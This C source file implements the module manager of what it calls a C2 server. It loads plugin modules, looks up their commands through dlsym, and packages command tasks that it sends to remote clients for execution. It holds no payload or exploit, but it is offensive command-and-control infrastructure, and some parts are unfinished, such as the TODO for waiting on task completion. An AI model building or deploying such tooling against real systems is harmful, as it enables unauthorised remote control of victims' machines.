/**
 * @file module_manager.c
 * @brief Module management implementation for C2 server
 */

#include "../include/module.h"
#include "../include/client.h"
#include "../include/task.h"
#include "../common/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <dlfcn.h>

// Module list
static module_t** modules = NULL;
static size_t modules_count = 0;
static pthread_mutex_t modules_mutex = PTHREAD_MUTEX_INITIALIZER;

/**
 * @brief Initialize module manager
 */
status_t module_manager_init(void) {
    // Initialize module list
    modules = NULL;
    modules_count = 0;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Shutdown module manager
 */
status_t module_manager_shutdown(void) {
    // Unload all modules
    pthread_mutex_lock(&modules_mutex);
    
    for (size_t i = 0; i < modules_count; i++) {
        module_unload(modules[i]);
    }
    
    free(modules);
    modules = NULL;
    modules_count = 0;
    
    pthread_mutex_unlock(&modules_mutex);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Load module
 */
status_t module_load(const char* name, const uint8_t* data, size_t data_len, module_t** module) {
    if (name == NULL || data == NULL || data_len == 0 || module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Check if module already exists
    module_t* existing_module = module_find(name);
    if (existing_module != NULL) {
        *module = existing_module;
        return STATUS_SUCCESS;
    }
    
    // Create module
    module_t* new_module = (module_t*)malloc(sizeof(module_t));
    if (new_module == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Initialize module
    memset(new_module, 0, sizeof(module_t));
    
    // Generate UUID
    uuid_generate(new_module->id);
    
    // Set name
    new_module->name = strdup(name);
    if (new_module->name == NULL) {
        free(new_module);
        return STATUS_ERROR_MEMORY;
    }
    
    // Set data
    new_module->data = (uint8_t*)malloc(data_len);
    if (new_module->data == NULL) {
        free(new_module->name);
        free(new_module);
        return STATUS_ERROR_MEMORY;
    }
    
    memcpy(new_module->data, data, data_len);
    new_module->data_len = data_len;
    
    // Set initial state
    new_module->state = MODULE_STATE_UNLOADED;
    
    // Add module to list
    pthread_mutex_lock(&modules_mutex);
    
    module_t** new_modules = (module_t**)realloc(modules, (modules_count + 1) * sizeof(module_t*));
    if (new_modules == NULL) {
        pthread_mutex_unlock(&modules_mutex);
        free(new_module->data);
        free(new_module->name);
        free(new_module);
        return STATUS_ERROR_MEMORY;
    }
    
    modules = new_modules;
    modules[modules_count] = new_module;
    modules_count++;
    
    pthread_mutex_unlock(&modules_mutex);
    
    *module = new_module;
    
    // Log module loading
    LOG_INFO("Module '%s' loaded", name);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Unload module
 */
status_t module_unload(module_t* module) {
    if (module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Close module handle if loaded
    if (module->handle != NULL) {
        dlclose(module->handle);
        module->handle = NULL;
    }
    
    // Free module context
    if (module->context != NULL) {
        free(module->context);
        module->context = NULL;
    }
    
    // Remove module from list
    pthread_mutex_lock(&modules_mutex);
    
    for (size_t i = 0; i < modules_count; i++) {
        if (modules[i] == module) {
            // Shift remaining modules
            for (size_t j = i; j < modules_count - 1; j++) {
                modules[j] = modules[j + 1];
            }
            
            modules_count--;
            break;
        }
    }
    
    pthread_mutex_unlock(&modules_mutex);
    
    // Free module data
    if (module->data != NULL) {
        free(module->data);
    }
    
    // Free module name
    if (module->name != NULL) {
        free(module->name);
    }
    
    // Free module description
    if (module->description != NULL) {
        free(module->description);
    }
    
    // Free module
    free(module);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Execute module command
 */
status_t module_execute(module_t* module, const char* command, const char* args, uint8_t** result, size_t* result_len) {
    if (module == NULL || command == NULL || result == NULL || result_len == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Check if module is initialized
    if (module->state != MODULE_STATE_INITIALIZED && module->state != MODULE_STATE_RUNNING) {
        return STATUS_ERROR_NOT_INITIALIZED;
    }
    
    // Get module commands
    module_command_t** commands = NULL;
    size_t commands_count = 0;
    
    status_t status = module_get_commands(module, &commands, &commands_count);
    if (status != STATUS_SUCCESS) {
        return status;
    }
    
    // Find command
    module_command_t* cmd = NULL;
    
    for (size_t i = 0; i < commands_count; i++) {
        if (strcmp(commands[i]->name, command) == 0) {
            cmd = commands[i];
            break;
        }
    }
    
    if (cmd == NULL) {
        free(commands);
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Execute command
    typedef status_t (*command_func_t)(const char*, uint8_t**, size_t*);
    command_func_t func = (command_func_t)cmd->function;
    
    status = func(args, result, result_len);
    
    // Free commands
    free(commands);
    
    return status;
}

/**
 * @brief Get module commands
 */
status_t module_get_commands(module_t* module, module_command_t*** commands, size_t* count) {
    if (module == NULL || commands == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Check if module is initialized
    if (module->state != MODULE_STATE_INITIALIZED && module->state != MODULE_STATE_RUNNING) {
        return STATUS_ERROR_NOT_INITIALIZED;
    }
    
    // Get module commands function
    typedef status_t (*get_commands_func_t)(module_command_t***, size_t*);
    get_commands_func_t func = (get_commands_func_t)dlsym(module->handle, "module_get_commands");
    
    if (func == NULL) {
        return STATUS_ERROR_NOT_FOUND;
    }
    
    // Call function
    return func(commands, count);
}

/**
 * @brief Find module by name
 */
module_t* module_find(const char* name) {
    if (name == NULL) {
        return NULL;
    }
    
    pthread_mutex_lock(&modules_mutex);
    
    for (size_t i = 0; i < modules_count; i++) {
        if (strcmp(modules[i]->name, name) == 0) {
            pthread_mutex_unlock(&modules_mutex);
            return modules[i];
        }
    }
    
    pthread_mutex_unlock(&modules_mutex);
    
    return NULL;
}

/**
 * @brief Find module by ID
 */
module_t* module_find_by_id(const uuid_t* id) {
    if (id == NULL) {
        return NULL;
    }
    
    pthread_mutex_lock(&modules_mutex);
    
    for (size_t i = 0; i < modules_count; i++) {
        if (uuid_compare(modules[i]->id, *id) == 0) {
            pthread_mutex_unlock(&modules_mutex);
            return modules[i];
        }
    }
    
    pthread_mutex_unlock(&modules_mutex);
    
    return NULL;
}

/**
 * @brief Get all modules
 */
status_t module_get_all(module_t*** modules_out, size_t* count) {
    if (modules_out == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    pthread_mutex_lock(&modules_mutex);
    
    // Create copy of modules array
    module_t** modules_copy = NULL;
    
    if (modules_count > 0) {
        modules_copy = (module_t**)malloc(modules_count * sizeof(module_t*));
        if (modules_copy == NULL) {
            pthread_mutex_unlock(&modules_mutex);
            return STATUS_ERROR_MEMORY;
        }
        
        memcpy(modules_copy, modules, modules_count * sizeof(module_t*));
    }
    
    *modules_out = modules_copy;
    *count = modules_count;
    
    pthread_mutex_unlock(&modules_mutex);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Load module on client
 */
status_t module_load_on_client(client_t* client, module_t* module) {
    if (client == NULL || module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Load module on client
    return client_load_module(client, module->name, module->data, module->data_len);
}

/**
 * @brief Unload module from client
 */
status_t module_unload_from_client(client_t* client, module_t* module) {
    if (client == NULL || module == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Unload module from client
    return client_unload_module(client, module->name);
}

/**
 * @brief Execute module command on client
 */
status_t module_execute_on_client(client_t* client, module_t* module, const char* command, const char* args, uint8_t** result, size_t* result_len) {
    if (client == NULL || module == NULL || command == NULL || result == NULL || result_len == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Create task to execute module command
    task_t* task = NULL;
    
    // Task data format: module_name_len(4) + module_name + command_len(4) + command + args_len(4) + args
    size_t module_name_len = strlen(module->name);
    size_t command_len = strlen(command);
    size_t args_len = (args != NULL) ? strlen(args) : 0;
    
    size_t task_data_len = sizeof(uint32_t) + module_name_len +
                          sizeof(uint32_t) + command_len +
                          sizeof(uint32_t) + args_len;
    
    uint8_t* task_data = (uint8_t*)malloc(task_data_len);
    if (task_data == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Set module name length
    uint32_t name_len = (uint32_t)module_name_len;
    memcpy(task_data, &name_len, sizeof(uint32_t));
    
    // Set module name
    memcpy(task_data + sizeof(uint32_t), module->name, module_name_len);
    
    // Set command length
    uint32_t cmd_len = (uint32_t)command_len;
    memcpy(task_data + sizeof(uint32_t) + module_name_len, &cmd_len, sizeof(uint32_t));
    
    // Set command
    memcpy(task_data + sizeof(uint32_t) + module_name_len + sizeof(uint32_t), command, command_len);
    
    // Set args length
    uint32_t arg_len = (uint32_t)args_len;
    memcpy(task_data + sizeof(uint32_t) + module_name_len + sizeof(uint32_t) + command_len, &arg_len, sizeof(uint32_t));
    
    // Set args
    if (args != NULL && args_len > 0) {
        memcpy(task_data + sizeof(uint32_t) + module_name_len + sizeof(uint32_t) + command_len + sizeof(uint32_t), args, args_len);
    }
    
    // Create task
    status_t status = task_create(&client->id, TASK_TYPE_MODULE, task_data, task_data_len, 60, &task);
    free(task_data);
    
    if (status != STATUS_SUCCESS) {
        return status;
    }
    
    // Send task to client
    protocol_message_t message;
    message.data = (uint8_t*)task;
    message.data_len = sizeof(task_t);
    
    status = protocol_manager_send_message(client->listener, client, &message);
    if (status != STATUS_SUCCESS) {
        task_destroy(task);
        return status;
    }
    
    // Wait for task completion
    // TODO: Implement task completion waiting
    
    return STATUS_SUCCESS;
}

/**
 * @brief Get modules loaded on client
 */
status_t module_get_client_modules(client_t* client, module_t*** modules_out, size_t* count) {
    if (client == NULL || modules_out == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Get client modules
    if (client->modules == NULL || client->modules_count == 0) {
        *modules_out = NULL;
        *count = 0;
        return STATUS_SUCCESS;
    }
    
    // Create copy of modules array
    module_t** modules_copy = (module_t**)malloc(client->modules_count * sizeof(module_t*));
    if (modules_copy == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    memcpy(modules_copy, client->modules, client->modules_count * sizeof(module_t*));
    
    *modules_out = modules_copy;
    *count = client->modules_count;
    
    return STATUS_SUCCESS;
}
